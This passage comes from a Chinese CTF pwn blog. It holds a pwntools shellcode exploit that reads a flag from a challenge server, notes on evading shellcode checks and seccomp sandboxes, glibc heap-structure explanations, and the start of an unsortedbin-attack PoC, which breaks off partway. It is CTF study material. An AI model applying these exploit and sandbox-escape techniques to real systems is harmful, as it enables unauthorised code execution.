class="built_in">hex</span>(<span class="built_in">len</span>(sc_open)))</span><br><span class="line">sc_read=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   /* read(fd, stack, 0x100) */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax         /* 返回的fd 3*/</span></span><br><span class="line"><span class="string">    mov rsi, rsp         /* 读取到栈上 3*/</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx        /*读取0x50字节 1*/</span></span><br><span class="line"><span class="string">    xor rax, rax         /* SYS_read = 0  占3字节*/</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sc_read)))</span><br><span class="line">sc_write=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* write(1, stack, rax) */</span></span><br><span class="line"><span class="string">    mov rdi, 1          /* stdout = 1 */</span></span><br><span class="line"><span class="string">    mov rax, 1          /* SYS_write = 1 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sc_write)))</span><br><span class="line"><span class="comment"># p=process(&#x27;./checkin&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;10.21.162.149&#x27;</span>,<span class="number">55771</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;signin~\n&quot;</span>)</span><br><span class="line">p.send(sc_open.ljust(<span class="number">0x16</span>,<span class="string">b&#x27;\x90&#x27;</span>)+asm(<span class="string">&#x27;jmp $+0xa&#x27;</span>))</span><br><span class="line">p.send(sc_read.ljust(<span class="number">0x16</span>,<span class="string">b&#x27;\x90&#x27;</span>)+asm(<span class="string">&#x27;jmp $+0xa&#x27;</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(sc_write.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x90&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Gashat!\n\n&quot;</span>)</span><br><span class="line">flag=p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="绕过特定字符的检查"><a href="#绕过特定字符的检查" class="headerlink" title="绕过特定字符的检查"></a>绕过特定字符的检查</h3><p>有些情况下，题目会对于你输入的shellcode进行某些检查，我们需要调整我们的shellcode进行检测绕过。</p>
<ul>
<li><h6 id="有些题目会先strlen-inputshellcode-得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在-x00的汇编-前提是读取shellcode时没有-x00截断-，这样检测实际上检测的内容是-x00前面的内容。而后面的shellcode就可以自由发挥啦"><a href="#有些题目会先strlen-inputshellcode-得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在-x00的汇编-前提是读取shellcode时没有-x00截断-，这样检测实际上检测的内容是-x00前面的内容。而后面的shellcode就可以自由发挥啦" class="headerlink" title="有些题目会先strlen(inputshellcode)得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在\x00的汇编(前提是读取shellcode时没有\x00截断)，这样检测实际上检测的内容是\x00前面的内容。而后面的shellcode就可以自由发挥啦"></a>有些题目会先strlen(inputshellcode)得到shellcode长度，再根据长度进行检测。在这种情况下我们在shellcode开头构造存在\x00的汇编(前提是读取shellcode时没有\x00截断)，这样检测实际上检测的内容是\x00前面的内容。而后面的shellcode就可以自由发挥啦</h6></li>
</ul>
<p>例子待补充</p>
<h3 id="突破沙箱的限制"><a href="#突破沙箱的限制" class="headerlink" title="突破沙箱的限制"></a>突破沙箱的限制</h3><p>在题目中遇到沙箱ban掉一些特定的系统调用的情况在ctf中屡见不鲜，沙箱的规则制定相对自由，不同题目可以不同组合ban，记录一下目前接触到的突破沙箱构造法</p>
<h4 id="等价函数替换"><a href="#等价函数替换" class="headerlink" title="等价函数替换"></a>等价函数替换</h4><p>一系列可能用到的等价替换函数：</p>
<ul>
<li><p>使用 <code>execveat</code> 代替 <code>execve</code></p>
</li>
<li><p>使用 <code>openat</code> 代替 <code>open</code></p>
</li>
<li><p>使用 <code>readv/writev</code> 代替 <code>read/write</code></p>
</li>
<li><p>使用 <code>mmap2</code> 代替 <code>mmap</code></p>
</li>
<li><p>orw中，使用 <code>sendfile</code>，代替 <code>read/write</code></p>
</li>
</ul>
<h4 id="切换指令模式绕过黑名单"><a href="#切换指令模式绕过黑名单" class="headerlink" title="切换指令模式绕过黑名单"></a>切换指令模式绕过黑名单</h4><p>当seccomp-tool工具发现沙箱中没有判断指令模式并且采取的是黑名单ban的模式，那么我们可以通过长返回retf的方式来实现架构切换。因为32位与64位同一个系统调用的调用号是不同的。</p>
<p>注意构造retf的栈布局：64——&gt;32位shellcode模版</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor esp, esp</span><br><span class="line">mov rsp, 0x400100</span><br><span class="line">mov eax, 0x23 ; cs</span><br><span class="line">mov [rsp+4], eax</span><br><span class="line">mov eax, 0x400800 ; ip</span><br><span class="line">mov [rsp], eax</span><br><span class="line">retf</span><br></pre></td></tr></table></figure>

<h3 id="纯ascii码shellcode"><a href="#纯ascii码shellcode" class="headerlink" title="纯ascii码shellcode"></a>纯ascii码shellcode</h3><p>这部分我还没碰到到过，这里有篇还没啃的blog：<a target="_blank" rel="noopener" href="https://nets.ec/Ascii_shellcode">https://nets.ec/Ascii_shellcode</a></p>
<p>这部分感觉技巧性很强，多用xor，inc，dec等精细到字的操作，对于shellcode水平要求很高，我如果真遇到应该也是试试工具了(雾</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/" class="post-title-link" itemprop="url">堆管理结构的利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-26 12:48:41" itemprop="dateCreated datePublished" datetime="2025-10-26T12:48:41+08:00">2025-10-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-29 20:15:31" itemprop="dateModified" datetime="2025-10-29T20:15:31+08:00">2025-10-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在面试中被问到unsortedbin attack的写入值的意义，知道是<code>main_areana+88</code>的位置，但是具体的意义以及利用方式却没有深究过。记录一下对于两个堆管理结构的学习笔记：<code>main_arena</code>以及<code>tcache_perthread_struct</code>的结构学习</p>
<h2 id="Main-arena"><a href="#Main-arena" class="headerlink" title="Main_arena"></a>Main_arena</h2><p>全局一个，位于glibc模块的内存附近，用于管理进程中主堆(用sbrk分配)，是arena环形链表的头节点。arena环形链表的非头节点为<code>thread arena</code>,通过mmap分配。</p>
<h4 id="libc中对于main-rena的定义"><a href="#libc中对于main-rena的定义" class="headerlink" title="libc中对于main_rena的定义"></a>libc中对于main_rena的定义</h4><p>这里用的是2.35的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __libc_lock_define (, mutex); <span class="comment">//锁</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags; <span class="comment">//标志位</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> have_fastchunks; <span class="comment">//快速判断fastbin是后有chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">//各个size的fastbin首地址</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top; <span class="comment">//指向top_chunk</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;  <span class="comment">//最近unsortedbin分配剩余的chunk地址</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>]; <span class="comment">//记录bins的信息</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">//指向arena链的后一个arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span> <span class="comment">//管理未被线程使用的空闲 arena</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads; <span class="comment">//记录使用此 arena 的线程数量</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;    <span class="comment">// 收缩堆的阈值</span></span><br><span class="line">  INTERNAL_SIZE_T top_pad;         <span class="comment">// top chunk的额外填充</span></span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  <span class="comment">// 使用mmap的阈值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_test;      <span class="comment">// arena测试值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_max;       <span class="comment">// arena最大数量</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line">  <span class="comment">/* Transparent Large Page support.  */</span></span><br><span class="line">  INTERNAL_SIZE_T thp_pagesize;    <span class="comment">// 透明大页大小</span></span><br><span class="line">  INTERNAL_SIZE_T hp_pagesize;     <span class="comment">// 大页大小</span></span><br><span class="line">  <span class="type">int</span> hp_flags;                    <span class="comment">// 大页标志</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;                    <span class="comment">// 当前mmap映射数量</span></span><br><span class="line">  <span class="type">int</span> n_mmaps_max;                <span class="comment">// 最大mmap映射数</span></span><br><span class="line">  <span class="type">int</span> max_n_mmaps;                <span class="comment">// 历史最大mmap数</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;           <span class="comment">// 是否禁用动态阈值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;    <span class="comment">// mmap分配的总内存</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;<span class="comment">// mmap内存的历史最大值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;                <span class="comment">// sbrk堆的起始地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_bins;             <span class="comment">// tcache bin数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_max_bytes;        <span class="comment">// tcache最大字节数</span></span><br><span class="line">  <span class="type">size_t</span> tcache_count;            <span class="comment">// 每个bin的chunk数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_limit;   <span class="comment">// tcache未排序限制</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,<span class="comment">//未上锁</span></span><br><span class="line">  .next = &amp;main_arena, <span class="comment">//指向自己形成arena链表闭环</span></span><br><span class="line">  .attached_threads = <span class="number">1</span> <span class="comment">//初始只有主线程附在arena上</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is only one instance of the malloc parameters.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p> 这里还有个全局唯一的mp_，作为堆分配的<code>配置策略以及记录arena的统计中心</code></p>
</blockquote>
<p>这里定义main_arena用了C 语言的 <strong>指定初始化器</strong>，具体解释可以见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42258222/article/details/105221108">https://blog.csdn.net/weixin_42258222/article/details/105221108</a></p>
<p>堆管理的结构实际上是malloc_state，而main_arena的定义其实就是初始化了一些malloc_state的成员，具体意义在注释中解释。</p>
<blockquote>
<p>这里解释一下线程附着在arena的意义:</p>
<ul>
<li>线程第一次调用 <code>malloc</code> 时，glibc 会根据线程 ID 做哈希，从环形链表挑一个 arena；</li>
<li>若该 arena 当前<strong>空闲</strong>（<code>attached_threads == 0</code>），就把计数 +1，同时把线程的 <code>tcb-&gt;arena</code> 指针指向它——<strong>此时称线程“附着”到这块 arena</strong>；</li>
<li>线程后续再 malloc&#x2F;free 都<strong>直接复用这块 arena</strong>，无需重新哈希</li>
<li>线程退出或调用 <code>malloc_consolidate</code> 迁移时，计数减 1；减到 0 表示<strong>没有任何线程再用它</strong>，这块 arena 就可以被整个释放或回收进全局缓存。</li>
</ul>
</blockquote>
<p>这里详细解释一下其中的bin数组:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 索引布局：</span></span><br><span class="line">bins[<span class="number">0</span>]                    <span class="comment">// 未使用</span></span><br><span class="line">bins[<span class="number">1</span>] = unsorted_bin.fd  <span class="comment">// unsorted bin 前向指针</span></span><br><span class="line">bins[<span class="number">2</span>] = unsorted_bin.bk  <span class="comment">// unsorted bin 后向指针</span></span><br><span class="line"></span><br><span class="line">bins[<span class="number">3</span>] = smallbin[<span class="number">1</span>].fd   <span class="comment">// size 0x20 的前向指针  </span></span><br><span class="line">bins[<span class="number">4</span>] = smallbin[<span class="number">1</span>].bk   <span class="comment">// size 0x20 的后向指针</span></span><br><span class="line">bins[<span class="number">5</span>] = smallbin[<span class="number">2</span>].fd   <span class="comment">// size 0x30 的前向指针</span></span><br><span class="line">bins[<span class="number">6</span>] = smallbin[<span class="number">2</span>].bk   <span class="comment">// size 0x30 的后向指针</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">bins[<span class="number">125</span>] = smallbin[<span class="number">62</span>].fd <span class="comment">// size 0x3f0 的前向指针</span></span><br><span class="line">bins[<span class="number">126</span>] = smallbin[<span class="number">62</span>].bk <span class="comment">// size 0x3f0 的后向指针</span></span><br><span class="line"></span><br><span class="line">bins[<span class="number">127</span>] = largebin[<span class="number">0</span>].fd  <span class="comment">// large bins 开始...</span></span><br><span class="line"><span class="comment">// 一直到 bins[253]</span></span><br></pre></td></tr></table></figure>

<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><p>管理对应线程的tcache，存储在<strong>堆内存开头</strong>，自身作为一个<strong>chunk</strong>被管理，在<strong>第一次需要时</strong>动态创建，一般是内存中第一个chunk。2.35版本下的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];<span class="comment">// 每个bin的chunk计数</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">// 每个bin的首个chunk</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>



<h2 id="利用实战"><a href="#利用实战" class="headerlink" title="利用实战"></a>利用实战</h2><p>TSctf-2025的uniform，题目中给了固定大小的chunk无限次uaf。考虑打unsortedbin attack攻击，攻击buf数组（用来存堆指针的数组）中某一索引，实现对于main_arena中自top成员后0x80大小的控制权。修改top指针可以实现迁移top_chunk而达到任意地址分配，当然这里注意对应位置要符合16位地址对其以及pre_size位为1。这里题目刚好存在一个全局变量在buf数组前面，构造此buf为一个合法且足够分配0x90大小chunk的top_chunk size，然后再通过main_arena修改将top_chunk迁移并修复unsorted_bin，分配就能控制buf数组啦。</p>
<p><img src="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/2.png" alt="main_arena中构造后，使top指向buf"></p>
<blockquote>
<p>构造后的main_arena中top指向buf</p>
</blockquote>
<p><img src="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/1.png" alt="成功将堆分配到buf字段"></p>
<blockquote>
<p>成功将堆分配到buf字段</p>
</blockquote>
<p>通过envirno泄露栈地址并覆盖返回值为rop链即可。</p>
<p>Poc.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;10.21.162.149&#x27;,64649)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">&#x27;description:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span 